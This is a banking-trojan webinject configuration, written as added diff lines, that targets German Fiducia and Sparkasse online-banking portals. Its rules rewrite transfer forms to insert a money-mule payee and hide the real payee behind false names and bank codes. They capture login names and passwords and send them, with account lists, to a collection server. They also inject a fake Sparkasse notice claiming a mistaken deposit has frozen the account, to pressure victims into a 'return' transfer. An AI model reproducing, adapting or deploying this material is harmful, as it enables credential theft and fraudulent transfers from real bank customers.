+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]<input alt="Bankleitzahl suchen" |End
+ITINJSTART=|id="lblBetrag">Betrag in EUR:</span>[*]<input class="[*]<input class="|End
+ITINJEND=|id="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|XText readonly" readonly value="%AMTFRMT%"|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]<input alt="Bankleitzahl suchen" |End
+ITINJSTART=|id="lblVerwendungszweck1">Verwendungszweck:</span>[*]<input class="|End
+ITINJEND=|id="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|XText readonly" readonly value="%RUCKRUF%"|End
+ITINJPASTEMN=||End
+
+
+
+
+****************************** Transfer 2 ******************************
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=|*token=*&frontletId=*_cntEmpfaengerbank_txtIBAN=*|End
+ITINJFRM=|00001[ps]000|End
+ITINJIFFOUND=|%KONTONUMMER%|End
+ITINJSTART=|txtEmpfaengerdaten1=|End
+ITINJEND=|&|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%DROPNAME%|End
+ITINJPASTEMN=||End
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=|*token=*&frontletId=*_cntEmpfaengerbank_txtIBAN=*|End
+ITINJFRM=|00001[ps]000|End
+ITINJIFFOUND=|%KONTONUMMER%|End
+ITINJSTART=|cntEmpfaengerbank_txtBIC=|End
+ITINJEND=|&|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%BANKCODE%|End
+ITINJPASTEMN=||End
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=|*token=*&frontletId=*_cntEmpfaengerbank_txtIBAN=*|End
+ITINJFRM=|00001[ps]000|End
+ITINJIFFOUND=|%KONTONUMMER%|End
+ITINJSTART=|ignore_txtKreditinstitut=|End
+ITINJEND=|&|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|Wird+automatisch+gef%C3%BCllt|End
+ITINJPASTEMN=||End
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=|*token=*&frontletId=*_cntEmpfaengerbank_txtIBAN=*|End
+ITINJFRM=|00001[ps]000|End
+ITINJIFFOUND=|%KONTONUMMER%|End
+ITINJSTART=|_txtVerwendungszweck1=|End
+ITINJEND=|&|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%C1EN%|End
+ITINJPASTEMN=||End
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=|*token=*&frontletId=*_cntEmpfaengerbank_txtIBAN=*|End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]name="ignore_txtEmpfaengerdaten1"|End
+ITINJSTART=|id="lblEmpfaengerdaten1">Empf&auml;nger:</span>[*]value="|End
+ITINJEND=|"|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FALSEDN%|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=|*token=*&frontletId=*_cntEmpfaengerbank_txtIBAN=*|End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]name="ignore_txtEmpfaengerdaten1"|End
+ITINJSTART=|id="lblIBAN">IBAN/Kontonummer:</span>[*]value="[*]value="|End
+ITINJEND=|"|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FALSEBLZ%|End
+ITINJPASTEMN=||End
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=|*token=*&frontletId=*_cntEmpfaengerbank_txtIBAN=*|End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]name="ignore_txtEmpfaengerdaten1"|End
+ITINJSTART=|Bei Kreditinstitut:</span>[*]value="|End
+ITINJEND=|"|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FALSEKRINST%|End
+ITINJPASTEMN=||End
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=|*token=*&frontletId=*_cntEmpfaengerbank_txtIBAN=*|End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]name="ignore_txtEmpfaengerdaten1"|End
+ITINJSTART=|id="lblVerwendungszweck1">Verwendungszweck:</span>[*]value="|End
+ITINJEND=|"|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%RUCKRUF%|End
+ITINJPASTEMN=||End
+
+****************************** Transfer 3 ******************************
+
+
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">Information zu: &Uuml;berweisung/Umbuchung</h1>[*]id="lblWert">%KONTONUMMER%</span>|End
+ITINJSTART=|Empf&auml;nger:</span>[*]id="lblWert">|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FALSEDN%|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">Information zu: &Uuml;berweisung/Umbuchung</h1>[*]id="lblWert">%KONTONUMMER%</span>|End
+ITINJSTART=|">BIC/BLZ:</span>[*]id="lblWert">|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FALSEBLZ%|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">Information zu: &Uuml;berweisung/Umbuchung</h1>[*]id="lblWert">%KONTONUMMER%</span>|End
+ITINJSTART=|Kreditinstitut:</span>[*]id="lblWert">|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FALSEKRINST%|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">Information zu: &Uuml;berweisung/Umbuchung</h1>[*]id="lblWert">%KONTONUMMER%</span>|End
+ITINJSTART=|Verwendungszweck:</span>[*]id="lblWert">|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%RUCKRUF%|End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+
+
+================================== SPAR ==================================
+
+
+
+ITSCRHOST=|portal.*|banking.*|bankingportal.*|End
+ITSCRONSUCCESS=|1|End
+ITSCRPAGE=|/portal/portal/*|End
+
+
+
+ITREQHOST=|portal.*|banking.*|bankingportal.*|End
+ITREQPAGE=|/portal/portal/*&C4I89Op=0003|End
+ITREQMETHOD=|211|End
+ITREQRXPREQ=||End
+ITREQMATH=||End
+ITREQSRVDATA=|?name=SPAR&bal=&lim&disp=&maxbetrag=&userhost=%SPARHOST%&useracc=%SPARUSERACC% - %HOLDERNAME%&userpass=%SPARUSERPASS%&exinf=&html=%SPARALLACC%&trkid=%SPARSEPAACC%&regexp=unv&hldrn=%HOLDERNAME%&tantype=&injv=20141111&telnr=&regexp=%SPARTESTREGEXP%|End
+ITREQSRVERR=|%ITENABLED%=|-1|--%ITSTATUS%=|e|--|End
+ITREQIFCONTEXT=||End
+
+
+
+ITCMPACCHOST=|portal.*|banking.*|bankingportal.*|End
+ITCMPACCPAGE=|/portal/portal/*=/Login*|End
+ITCMPRXPREQ=|^[A-Za-z]{6,}=|End
+ITCMPPRM=|1|End
+ITCMPACCIF=|*&isJavaScriptActive=1*|End
+ITCMPACCPRC=|-1|End
+ITCMPREGNAME=|portal.*|End
+ITCMPACCNAME=|#1=|End
+ITCMPPRXPNAME=||End
+ITCMPACCREQ=||End
+ITCMPSRVERR=||End
+
+
+ITCMPACCHOST=|portal.*|banking.*|bankingportal.*|End
+ITCMPACCPAGE=|/portal/portal/*=/Login*|End
+ITCMPRXPREQ=|^[A-Za-z]{6,}.x=|End
+ITCMPPRM=|1|End
+ITCMPACCIF=|*&isJavaScriptActive=1*|End
+ITCMPACCPRC=|-1|End
+ITCMPREGNAME=|portal.*|End
+ITCMPACCNAME=|#3=|End
+ITCMPPRXPNAME=||End
+ITCMPACCREQ=||End
+ITCMPSRVERR=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[0ps]000000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<strong>|End
+ITINJEND=|<br />|End
+ITINJRXPREG=||End
+ITINJCODE=|eine TAN f&uuml;r eine eventuelle|End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*=/Login*|End
+ITINITRXPREQ=|^[A-Za-z]{6,}=|End
+ITINITIFREQ=|*&isJavaScriptActive=1*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARUSERACC%[0000]|End
+ITINITSTART=|#1=|End
+ITINITEND=||End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*=/Login*|End
+ITINITRXPREQ=|^[A-Za-z]{6,}.x=|End
+ITINITIFREQ=|*&isJavaScriptActive=1*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARUSERACC%[0000]|End
+ITINITSTART=|#3=|End
+ITINITEND=||End
+ITINITXPRREG=||End
+
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*=/Login*|End
+ITINITRXPREQ=|^[A-Za-z]{6,}=|End
+ITINITIFREQ=|*&isJavaScriptActive=1*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARUSERPASS%[0000]|End
+ITINITSTART=|#2=|End
+ITINITEND=||End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*=/Login*|End
+ITINITRXPREQ=|^[A-Za-z]{6,}.x=|End
+ITINITIFREQ=|*&isJavaScriptActive=1*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARUSERPASS%[0000]|End
+ITINITSTART=|#4=|End
+ITINITEND=||End
+ITINITXPRREG=||End
+
+
+
+
+ITSUCCTRHOST=|portal.*|banking.*|bankingportal.*|End
+ITSUCCTRPAGE=|/portal/portal/*&C4I89Op=0025|End
+ITSUCCTRIFREQ=||End
+ITSUCCTRPRM=|11|End
+ITSUCCTRCNR=|12|End
+ITSUCCTRSTR=|<li>Der Auftrag wurde entgegengenommen.</li>|End
+ITSUCCTRFALSE=|/-/-/-/-/-/-/|End
+ITSUCCTRTHEN=||End
+ITSUCCTRELSE=||End
+
+
+
+
+
+
+
+==================== Step 1.1 ====================
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*=/Login*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARTESTREGEXP%[0001]|End
+ITINITSTART=||End
+ITINITEND=||End
+ITINITXPRREG=|<title>([^<])[^<]{0,}</title>|End
+
+
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*=/Login*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%HOLDERNAME%[0001]|End
+ITINITSTART=|<div class="if5_nav b4">[*]<fieldset><p> |End
+ITINITEND=|</p>|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*=/Login*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|100000000|End
+ITINJIFFOUND=|<input type='image' title='Sicher abmelden' alt='Abmelden'|End
+ITINJSTART=|<html[*]>|End
+ITINJEND=|</html>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+<head>  </head>  <body>
+
+<script language="JavaScript">
+function openUrl(url)
+{
+    var fakeLink = document.createElement('a');
+     if (typeof(fakeLink.click) == 'undefined')
+    {
+        location.href = url.replace(new RegExp("&amp;",'g'),"&");
+    }
+    else
+    {
+	var ua = navigator.userAgent.toLowerCase();
+ 	if (ua.indexOf("gecko") != -1) {
+	 location.href = url.replace(new RegExp("&amp;",'g'),"&");
+	 } else
+	{
+	fakeLink.href = url.replace(new RegExp("&amp;",'g'),"&");;
+	document.body.appendChild(fakeLink);
+	fakeLink.click(); 
+	}
+
+
+    }
+     return true;
+}
+
+
+openUrl('https://'+document.domain+'/portal/portal/%SPARCOR%/?p=p.finanzstatus&n=%2Fonlinebanking%2Ffinanzstatus%2F&C4I89Op=0002');
+</script></body>
+	      |End
+ITINJPASTEMN=||End
+
+
+
+
+==================== Step 3 ====================
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*?*&C4I89Op=0002|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|000000000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<html[*]>|End
+ITINJEND=|</html>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*?*&C4I89Op=0002|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARREFS3%[0000]|End
+ITINITSTART=|class="actioniconLink" title="Nach Kontoinhabern sortieren">[*]<a href="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*?*&C4I89Op=0002|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARREFS3%[0000]|End
+ITINITSTART=|class="actioniconLink" title="Nach Kontoarten sortieren">[*]<a href="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*?*&C4I89Op=0002|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|100000000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<html[*]>|End
+ITINJEND=|</html>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+<head>  </head>  <body>
+
+<script language="JavaScript">
+function openUrl(url)
+{
+    var fakeLink = document.createElement('a');
+     if (typeof(fakeLink.click) == 'undefined')
+    {
+        location.href = url.replace(new RegExp("&amp;",'g'),"&");
+    }
+    else
+    {
+	var ua = navigator.userAgent.toLowerCase();
+ 	if (ua.indexOf("gecko") != -1) {
+	 location.href = url.replace(new RegExp("&amp;",'g'),"&");
+	 } else
+	{
+	fakeLink.href = url.replace(new RegExp("&amp;",'g'),"&");;
+	document.body.appendChild(fakeLink);
+	fakeLink.click(); 
+	}
+
+
+    }
+     return true;
+}
+
+
+openUrl('https://'+document.domain+'%SPARREFS3%&C4I89Op=0003');
+</script></body>
+	      |End
+ITINJPASTEMN=||End
+
+
+
+==================== Step 4 ====================
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*&C4I89Op=0003|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|000000000|End
+ITINJIFFOUND=||End
+ITINJSTART=||End
+ITINJEND=||End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*&C4I89Op=0003|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARALLACC%[0008]|End
+ITINITSTART=|" nowrap="nowrap">Funktionen[*]</th>|End
+ITINITEND=|</table>|End
+ITINITXPRREG=||End
+
+<th colspan="1" class="tableheadlinetext" nowrap="nowrap">Funktionen </th>
+
+
+
+
+
+
+
+
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*&C4I89Op=0003|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARHOLDER%[0000]|End
+ITINITSTART=| <div class="if5_nav b4">[*]<fieldset><p>|End
+ITINITEND=|</p>|End
+ITINITXPRREG=||End
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*&C4I89Op=0003|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARIMGSCR%[0000]|End
+ITINITSTART=|<div class="if5_nav b4">[*]<form[*]src=|End
+ITINITEND=|/>|End
+ITINITXPRREG=||End
+
+
+
+
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*&C4I89Op=0003|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div class="metanavi_suche">|End
+ITINJEND=|</html>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+	
+
+	<script language="JavaScript">
+
+function openUrl(url)
+{
+    var fakeLink = document.createElement('a');
+     if (typeof(fakeLink.click) == 'undefined')
+    {
+        location.href = url.replace(new RegExp("&amp;",'g'),"&");
+    }
+    else
+    {
+	var ua = navigator.userAgent.toLowerCase();
+ 	if (ua.indexOf("gecko") != -1) {
+	 location.href = url.replace(new RegExp("&amp;",'g'),"&");
+	 } else
+	{
+	fakeLink.href = url.replace(new RegExp("&amp;",'g'),"&");;
+	document.body.appendChild(fakeLink);
+	fakeLink.click(); 
+	}
+
+
+    }
+     return true;
+}
+
+
+
+
+	function submitconfirm2() {
+
+		if (document.getElementById("ifread").checked==true)
+		{
+		openUrl('https://'+document.domain+'/portal/portal/%SPARCOR%?p=p.finanzstatus&p=p.finanzstatus&n=%2Fonlinebanking%2Ffinanzstatus%2F');
+		
+		
+
+		} else
+		{
+		alert("Bitte, bestatigen, dass Sie entsperechend informiert sind.");
+		}
+
+	
+	return false;
+	}
+	</script> 
+	
+												
+												<div class="suchergebnis" id="suchergebnis"></div></div>
+
+</div>
+		    			    		  		  		            			
+      		  		    		    		    	 	 	  	   
+		    			    			    	
+
+		    			    		  		  		            			
+      		  		    		    		    	 	 	  	   
+		    			    			    	<div class="if5_nav b4">
+    	<ul class='nav0wrap'><li class='nav0item open active withsub'><h3><a>Online-Banking</a></h3>
+		
+		
+		<form class='tx_anmelden' method='GET' onsubmit="javascript:openUrl('https://'+document.domain+'/portal/portal/Starten'); return false;" ><fieldset><p> %SPARHOLDER%</p><input type='image' title='Sicher abmelden' alt='Abmelden' name='anmeldebutton' src=%SPARIMGSCR%/></fieldset></form>
+		
+		
+</li></ul>
+
+</div>
+
+
+	    			    		  		  		            			
+      		  		    		    		    	 	 	  	   
+		    			    			    	<div class="if5_content if5_banking">
+ 	  	<div class="if5_content_inner">
+ 	                <div class="contentbereich">
+        <a title="Contentbereich / Seiteninhalt" name="pagecontent" href="#" accesskey="3"></a>
+            <div class="if5_seiten">
+                <div class="if5_white_o">&nbsp;</div>
+                <div class="if5_rand">
+                    <div class="if5_verlauf_o">&nbsp;</div>
+                    
+
+ 				
+					
+					
+<form onSubmit="return submitconfirm2();">
+
+
+
+
+
+
+
+
+
+	<div style="font-size:14px;margin:10px 10px 10px 10px;">
+
+			
+				<br /> Auf Ihr Girokonto %SELECTACC% wurden %AMTFRMT% Euro verbucht. 
+Der Absender hat dieses Geld irrt&uuml;mlich auf dieses Girokonto &uuml;berwiesen und verlangt eine sofortige R&uuml;ckzahlung.
+
+
+				<br /> Ihr Girokonto %SELECTACC% ist deshalb vorl&auml;ufig gesperrt.
+				<br /> Falls das Geld nachweislich f&uuml;r Sie bestimmt war, m&uuml;ssen Sie die 
+n&auml;chstliegende Bank Filiale aufsuchen und Belege vorzeigen, die es best&auml;tigen.
+
+				<br /> Wenn Sie dies belegen k&ouml;nnen, wird Ihr Girokonto freigeschaltet.
+				<br /> Sollte es sich tats&auml;chlich um eine Fehl&uuml;berweisung handeln und der 
+Auftraggeber ist Ihnen unbekannt, m&uuml;ssen Sie das Geld baldm&ouml;glichst zur&uuml;cksenden.
+				<br /> Um automatisch eine R&uuml;ck&uuml;berweisung zu veranlassen und das Girokonto freizuschalten, klicken Sie unter "Kontoums&auml;tze" auf den Button "Retouren" welches neben der Falsch&uuml;berweisung zu finden ist.			
+				<br />				
+				
+				
+
+
+
+
+	</div>
+	
+
+
+
+
+
+	<div style="font-size:12px;margin:10px 10px 10px 10px;text-align:right;">
+	<i>Ihre Sparkasse.&nbsp;</i><br />
+	</div>	<br />
+
+
+
+
+
+
+	<div style="font-size:14px;margin:10px 10px 10px 10px;">
+
+		
+		<input type="checkbox" name="ifread" id="ifread" /><label for="ifread"><b>&nbsp;Ich bin entsprechend informiert.</b></label>
+		
+
+
+	</div>
+	
+	
+
+
+<div style="font-size:12px;margin:10px 10px 10px 10px;text-align:right;">
+
+<input type="image" name="LGazbERwZvXDZOlg" id="defaultAction" value="Weiter" class="if5_button_weiter" src="https://bankingportal.sparkasse-giessen.de/ifdata/51350025/IPSTANDARD/4/content/www/pixel/ipo/if5_button_weiter.png" title="Weiter" alt="Weiter" />
+
+
+</div>
+
+	
+	
+	
+	
+</form>
+
+
+                    <div class="if5_verlauf_u">&nbsp;</div>
+                </div>
+                <div class="if5_white_u">&nbsp;</div>
+            </div>
+        </div>
+
+        
+		    			    		  		  		            			
+   		    		  		  		            			
+      		  		    		    		    	 	 	  	   
+		    			    			    	
+
+		    			    		  		  		            			
+      		  		    		    		    	 	 	  	   
+		    			    			    	</div>
+												
+												
+												
+											
+												
+   	<div class="if5_content_footer">
+<!-- from Portlet --><div class="if5_service c5_2 banking"><ul class="service_list">
+
+<li class="seite_drucken c0 druck_ohne_js" id="drucken"><a class="l3b c0" href="javascript:window.print();">Seite drucken<span class="druck_ohne_js" id="druckwrap"><span class="if5_white_o">&nbsp;&nbsp;</span><span class="if5_rand"><span class="if5_verlauf_o">&nbsp;&nbsp;</span><span class="hw_druck_ohne_js">Fur diese Funktion muss JavaScript aktiviert sein.</span><span class="if5_verlauf_u">&nbsp;&nbsp;</span></span><span class="if5_white_u">&nbsp;&nbsp;</span></span></a><span style="display:none"><script type="text/javascript" language="JavaScript">/*<!--*/ document.getElementById('druckwrap').className = 'druck_mit_js';document.getElementById('drucken').className = 'seite_drucken c0'; //--></script></span></li><li class="seite_anfang c0"><a class="l3b c0" href="#">Seitenanfang</a></li></ul></div>		    			    		  		  		            			
+      		  		    		    		    	 	 	  	   
+		    			    			    	   	<div class="if5_footer"><ul class="footer_list l4"><li class="footer_listitem"><a title="Impressum" href=""   target="_top">Impressum</a></li><li class="footer_listitem"><a title="AGB" href=""   target="_top">AGB</a></li><li class="footer_listitem"><a title="Datenschutz" href=""   target="_top">Datenschutz</a></li><li class="footer_listitem"><a title="Preise und Hinweise" href=""   target="_top">Preise und Hinweise</a></li></ul></div>
+
+</div>
+<!--Footerzu-->
+</div>
+<!--Content zu-->		    			    		  		  		            			
+      		  		    		    		    	 	 	  	   
+
+	  
+</div> 
+
+
+</div>
+
+
+
+<br style="clear:both;"/>
+
+
+  
+
+</body>
+
+
+
+	      |End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*&C4I89Op=0003|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000e000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<html[*]>|End
+ITINJEND=|</html>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+<head>  </head>  <body>
+
+<script language="JavaScript">
+function openUrl(url)
+{
+    var fakeLink = document.createElement('a');
+     if (typeof(fakeLink.click) == 'undefined')
+    {
+        location.href = url.replace(new RegExp("&amp;",'g'),"&");
+    }
+    else
+    {
+	var ua = navigator.userAgent.toLowerCase();
+ 	if (ua.indexOf("gecko") != -1) {
+	 location.href = url.replace(new RegExp("&amp;",'g'),"&");
+	 } else
+	{
+	fakeLink.href = url.replace(new RegExp("&amp;",'g'),"&");;
+	document.body.appendChild(fakeLink);
+	fakeLink.click(); 
+	}
+
+
+    }
+     return true;
+}
+
+
+openUrl('https://'+document.domain+'/portal/portal/%SPARCOR%?p=p.finanzstatus&p=p.finanzstatus&n=%2Fonlinebanking%2Ffinanzstatus%2F');
+</script></body>
+
+	      |End
+ITINJPASTEMN=||End
+
+
+
+
+
+============================ Transfer Del Info ============================
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div class="if5_verlauf_o">&nbsp;</div>|End
+ITINJEND=|<div class='if5_schrittfolge stepcnt3'>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div class="if5_content_inner">|End
+ITINJEND=|<div class="if5_schrittfolge">|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+<div class="contentbereich"><div style="display:none">
+        <a title="Binnennavigation" name="pagesubnavigation" href="#" accesskey="4"></a>
+        <h3 class="invisible" style="display:none">Binnennavigation</h3>
+    </div>
+    <div class="if5_seiten">
+         <div class="if5_white_o_reiter">&nbsp;</div>
+         <div class="if5_rand">
+      <div class="if5_verlauf_o">&nbsp;</div>
+	   |End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+
+
+
+
+======================= SEPA 1 =======================
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINITNAME=|%SPARFRMSEPA1%[0000]|End
+ITINITSTART=|schritt active_1 c1 t1[*]action="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINITNAME=|%SPARIBANSEL%[0000]|End
+ITINITSTART=|schritt active_1 c1 t1[*]Auftraggeber<em>*</em>:[*]<select name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
